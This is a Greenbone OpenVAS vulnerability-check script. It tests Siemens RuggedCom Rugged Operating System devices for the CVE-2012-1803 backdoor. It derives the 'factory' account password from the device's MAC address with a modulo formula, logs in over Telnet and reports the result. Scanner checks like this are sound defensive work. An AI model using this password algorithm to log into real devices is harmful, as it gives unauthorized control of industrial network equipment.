###############################################################################
# OpenVAS Vulnerability Test
#
# Rugged Operating System Backdoor Unauthorized Access Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/o:siemens:ruggedcom_rugged_operating_system";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103499");
  script_version("2023-03-01T10:20:04+0000");
  script_cve_id("CVE-2012-1803");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2012-06-21 13:07:51 +0200 (Thu, 21 Jun 2012)");
  script_name("Rugged Operating System Backdoor Unauthorized Access Vulnerability (Telnet)");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_siemens_ruggedcom_consolidation.nasl", "toolcheck.nasl", "gb_default_credentials_options.nasl");
  script_require_ports("Services/telnet", 23);
  script_mandatory_keys("siemens_ruggedcom/telnet/detected", "Tools/Present/perl");
  script_exclude_keys("default_credentials/disable_default_account_checks");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53215");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/522467");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-12-116-01.pdf");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-12-146-01.pdf");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/889195");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"Rugged Operating System is prone to an unauthorized-access
  vulnerability due to a backdoor in all versions of the application.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to gain unauthorized access to the
  affected application. This may aid in further attacks.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

if(get_kb_item("default_credentials/disable_default_account_checks"))
  exit(0);

include("telnet_func.inc");
include("host_details.inc");
include("misc_func.inc");
include("dump.inc");

if(!port = get_app_port(cpe:CPE, service:"telnet"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

banner = telnet_get_banner(port:port);
if(!banner || ("Rugged Operating System" >!< banner || "MAC Address" >!< banner))
  exit( 0 );

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

r = telnet_negotiate(socket:soc);
if(!r || "Rugged Operating System" >!< r || "MAC Address" >!< r) {
  telnet_close_socket(socket:soc, data:r);
  exit(0);
}

mac_string = eregmatch(pattern:"MAC Address:[ ]+([0-9A-F-]+)", string:r);
if(!mac_string[1]) {
  telnet_close_socket(socket:soc, data:r);
  exit(0);
}

mac = mac_string[1];
mac = split(mac, sep:"-", keep:FALSE);
if(max_index(mac) != 6) {
  telnet_close_socket(socket:soc, data:r);
  exit(0);
}

for(x=5; x >= 0; x--) {
  mac_reverse += mac[x];
}

mac_reverse += '0000';

# it seems that the resulting int is too big for nasl and computing the pass fail. perl also warn about an "Integer overflow in hexadecimal" (on 32bit) but compute right.
# so use perl...
argv[i++] = "perl";
argv[i++] = "-X";
argv[i++] = "-e";
argv[i++] = 'print (hex("' + mac_reverse  + '") % 999999929);';
argv[i++] = '2>/dev/null';
pass = pread(cmd:"perl", argv:argv, cd:FALSE);

if(pass !~ "[0-9]+") {
  telnet_close_socket(socket:soc, data:r);
  exit(0);
}

user = "factory";

send(socket:soc, data:user + '\n');
recv = recv(socket:soc, length:512);
if(!recv || "Enter Password" >!< recv) {
  telnet_close_socket(socket:soc, data:recv);
  exit(0);
}

send(socket:soc, data:pass + '\n');
recv = recv(socket:soc, length:2048);
telnet_close_socket(socket:soc, data:recv);

if("Main Menu" >< recv && ("Administration" >< recv || "Ethernet Ports" >< recv || "Diagnostics" >< recv)) {
  security_message(port:port, data:'It was possible to login into the Rugged Operating System using username "factory" and password "' + pass + '".');
  exit(0);
}

exit(99);
